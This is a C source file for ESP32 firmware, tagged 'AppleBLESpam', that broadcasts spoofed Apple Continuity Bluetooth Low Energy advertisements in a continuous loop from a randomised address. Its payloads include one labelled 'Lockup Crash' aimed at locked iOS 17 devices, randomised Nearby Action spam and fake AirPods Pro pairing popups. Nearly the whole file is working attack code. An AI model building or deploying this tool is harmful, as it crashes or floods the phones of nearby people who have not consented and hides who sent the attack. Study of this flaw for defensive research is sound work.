#include <stdio.h>
//#include <Arduino.h>
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
//#include "esp_bt_main.h"
//#include "esp_gap_ble_api.h"
#include "continuity.h"
#include <esp_err.h>
#include <nvs_flash.h>
#include "esp_bt_main.h"
#include <esp_gap_ble_api.h>
#include <esp_bt.h>

static const char *TAG = "AppleBLESpam";

typedef struct {
    const char* title;
    const char* text;
    bool random;
    ContinuityMsg msg;
} Payload;

static Payload payloads[] = {
    {
        .title = "Lockup Crash",
        .text = "iOS 17, locked, long range",
        .random = false,
        .msg = {
            .type = ContinuityTypeCustomCrash,
            .data = {.custom_crash = {}},
        }
    },
    {
        .title = "Random Action",
        .text = "Spam shuffle Nearby Actions",
        .random = true,
        .msg = {
            .type = ContinuityTypeNearbyAction,
            .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
        }
    },
    {
        .title = "AirPods Pro",
        .text = "Modal, spammy (auto close)",
        .random = false,
        .msg = {
            .type = ContinuityTypeProximityPair,
            .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
        }
    },
};

#define PAYLOAD_COUNT (sizeof(payloads) / sizeof(payloads[0]))
#define ADV_INTERVAL_MS 100

static uint8_t adv_data[31];
static uint8_t adv_data_len = 0;

static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    switch (event) {
    case ESP_GAP_BLE_ADV_DATA_SET_COMPLETE_EVT:
        ESP_LOGI(TAG, "Advertisement data set complete");
        esp_ble_gap_start_advertising(NULL);
        break;
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
        if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS) {
            ESP_LOGI(TAG, "Advertising started");
        } else {
            ESP_LOGE(TAG, "Advertising start failed");
        }
        break;
    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
        if (param->adv_stop_cmpl.status == ESP_BT_STATUS_SUCCESS) {
            ESP_LOGI(TAG, "Advertising stopped");
        } else {
            ESP_LOGE(TAG, "Advertising stop failed");
        }
        break;
    default:
        break;
    }
}

static void init_ble(void) {
    esp_err_t ret;

    nvs_flash_init();
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init();
    esp_bluedroid_enable();
    esp_ble_gap_register_callback(gap_event_handler);

    uint8_t mac[6];
    esp_fill_random(mac, sizeof(mac));
    esp_ble_gap_set_rand_addr(mac);
}

static void set_adv_data(Payload *payload) {
    ContinuityMsg *msg = &payload->msg;
    if (payload->random) {
        msg->data.nearby_action.type = rand() % 0xFF;
    }

    adv_data_len = continuity_get_packet_size(msg->type);
    if (adv_data_len > sizeof(adv_data)) {
        ESP_LOGE(TAG, "Advertisement data too large");
        return;
    }
    continuity_generate_packet(msg, adv_data);
    esp_ble_gap_config_adv_data_raw(adv_data, adv_data_len);
}

static void ble_spam_task(void *pvParameters) {
    int payload_index = 0;

    while (1) {
        Payload *payload = &payloads[payload_index];
        ESP_LOGI(TAG, "Sending: %s - %s", payload->title, payload->text);

        set_adv_data(payload);
        vTaskDelay(ADV_INTERVAL_MS / portTICK_PERIOD_MS);

        esp_ble_gap_stop_advertising();
        vTaskDelay(50 / portTICK_PERIOD_MS);

        payload_index = (payload_index + 1) % PAYLOAD_COUNT;
    }
}

void app_main(void) {
    init_ble();
    xTaskCreate(ble_spam_task, "ble_spam_task", 4096, NULL, 5, NULL);
}
